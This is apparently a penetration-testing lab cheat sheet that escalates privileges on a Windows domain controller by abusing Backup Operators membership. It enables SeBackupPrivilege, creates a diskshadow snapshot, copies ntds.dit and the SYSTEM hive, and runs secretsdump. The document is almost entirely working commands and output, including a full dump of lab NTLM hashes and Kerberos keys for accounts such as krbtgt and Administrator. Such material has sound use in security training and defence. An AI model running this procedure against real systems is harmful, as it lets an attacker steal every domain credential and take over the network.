# Backup Operators

## Current User Groups

```pwsh
PS C:\Users\svc_backup> whoami /groups
```

```output title="Output" hl_lines="7"
GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

## Current User Privileges

```pwsh
PS C:\Users\svc_backup> whoami /priv
```

```output title="Output" hl_lines="7 8"
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

## [SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)

```pwsh
PS C:\Users\svc_backup> Import-Module C:\Tools\SeBackupPrivilege\SeBackupPrivilegeCmdLets\bin\Debug\SeBackupPrivilegeUtils.dll
PS C:\Users\svc_backup> Import-Module C:\Tools\SeBackupPrivilege\SeBackupPrivilegeCmdLets\bin\Debug\SeBackupPrivilegeCmdLets.dll
PS C:\Users\svc_backup> Set-SeBackupPrivilege
PS C:\Users\svc_backup> Get-SeBackupPrivilege
```

```output title="Output"
SeBackupPrivilege is enabled
```

## Shadow Copy

```pwsh
PS C:\Users\svc_backup> diskshadow
```

```sh
DISKSHADOW> SET VERBOSE ON
DISKSHADOW> SET METADATA "C:\Windows\Temp\meta.cab"
DISKSHADOW> SET CONTEXT CLIENTACCESSIBLE
DISKSHADOW> SET CONTEXT PERSISTENT
DISKSHADOW> BEGIN BACKUP
DISKSHADOW> ADD VOLUME C: ALIAS SYSTEM
DISKSHADOW> CREATE
DISKSHADOW> EXPOSE "%SYSTEM%" E:
DISKSHADOW> END BACKUP
DISKSHADOW> EXIT
```

## Copying NTDS.DIT

### [Robocopy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)

```pwsh
PS C:\Users\svc_backup> robocopy /B "E:\Windows\NTDS" "C:\Tools" "ntds.dit"
```

### Copy-FileSeBackupPrivilege

```pwsh
PS C:\Users\svc_backup> Copy-FileSeBackupPrivilege "E:\Windows\NTDS\ntds.dit" "C:\Tools\ntds.dit"
```

## Copying Hives

```pwsh
PS C:\Users\svc_backup> reg save "hklm\system" C:\Tools\system.save
```

## Dumping Hashes

```sh
my@attack:~$ secretsdump.py -ntds ntds.dit -system system.save -hashes lmhash:nthash LOCAL
```

```output title="Output" hl_lines="6"
[*] Target system bootKey: 0xc0a9116f907bd37afaaa845cb87d0550
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 85541c20c346e3198a3ae2c09df7f330
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WINLPE-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:d40e542076cd9a0c7546860cf1b50d3e:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129:::
htb-student:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
bob:1105:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
hyperv_adm:1106:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
printsvc:1107:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
server_adm:1108:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
netadm:1109:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
logger:1110:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
[*] Kerberos keys from ntds.dit
Administrator:aes256-cts-hmac-sha1-96:f220c24907b50fe1666a8227013389f60c775440806853065f80d9ecbe5a4a18
Administrator:aes128-cts-hmac-sha1-96:9f9f3c7d7a4db1dc88197c0b00b444f9
Administrator:des-cbc-md5:a7fe6bceb9975107
WINLPE-DC01$:aes256-cts-hmac-sha1-96:610e371a4ef916c6d69c4a105cb332f7cd5d0f3dece66ac8b9585488f95de420
WINLPE-DC01$:aes128-cts-hmac-sha1-96:a0897f292b0feb8de3d4835123fae19e
WINLPE-DC01$:des-cbc-md5:c797da7cab3e701a
krbtgt:aes256-cts-hmac-sha1-96:561745704448a32cb5d7755e87063a126d8061605d19302dbf6182801594a4b1
krbtgt:aes128-cts-hmac-sha1-96:f98f8b9da297e621771c2f7eb8f74ce3
krbtgt:des-cbc-md5:62ba328fa75e8ab0
htb-student:aes256-cts-hmac-sha1-96:34bb4aad96edfa4e415c18a7349d79e844e9a77e82cfa0f895cbb77232f2d5f2
htb-student:aes128-cts-hmac-sha1-96:7942e154d896dcee69a5e1157d3f1049
htb-student:des-cbc-md5:85255bf1da9b8ff1
svc_backup:aes256-cts-hmac-sha1-96:c6edc088546c2c3589489519606b85620263dbaa80802491f4eee870c06202f6
svc_backup:aes128-cts-hmac-sha1-96:af521a84ab7773e24480e1f9b90b1bd7
svc_backup:des-cbc-md5:152fb5971f25c8f4
bob:aes256-cts-hmac-sha1-96:f7a760ec47ffaf2d63e5dae23c70f33191e4c7390820298a4ff29ad200cc2f6c
bob:aes128-cts-hmac-sha1-96:0229e9d9787bbae2249b775c2d623a1c
bob:des-cbc-md5:61029d79dfd389a2
hyperv_adm:aes256-cts-hmac-sha1-96:b7620e2a6b3d7a5663ef3b54bd508481232fe0205248628bb032fb5d69c134c9
hyperv_adm:aes128-cts-hmac-sha1-96:e54b90a25cf52f236a4aa667cf8f51fb
hyperv_adm:des-cbc-md5:5e2f9e8080c40819
printsvc:aes256-cts-hmac-sha1-96:f61791439192f8e3cd2a824248678b7ef3245e81a4ab8b5360cf5de91d34a440
printsvc:aes128-cts-hmac-sha1-96:0acc1b2b04d8912f2395106349c1c186
printsvc:des-cbc-md5:3e8a5ba7a76262cb
server_adm:aes256-cts-hmac-sha1-96:4e18a61547914e1f0bf29623ae1a18f8898a9d8939b36541c21a68d4561c96c0
server_adm:aes128-cts-hmac-sha1-96:d0279a168af61ac1979f4b6dd41a91bb
server_adm:des-cbc-md5:e3e6dcf4753886e9
netadm:aes256-cts-hmac-sha1-96:a73fcce0ceeeb1976019a0eddbaa8f710df96b92dbbf0c4e65d9d56a24ddbbd0
netadm:aes128-cts-hmac-sha1-96:5a78f660b2f6791794ae1cebd2b4238c
netadm:des-cbc-md5:0d76a40bf89b79da
logger:aes256-cts-hmac-sha1-96:d3e3efdb8980b8754739f0fed541dd7db3dd96862ffb4ebade3b2e9bd3287f41
logger:aes128-cts-hmac-sha1-96:6184c8de58a794ae380975884b66f5cb
logger:des-cbc-md5:b9c85b5720b3589b
```
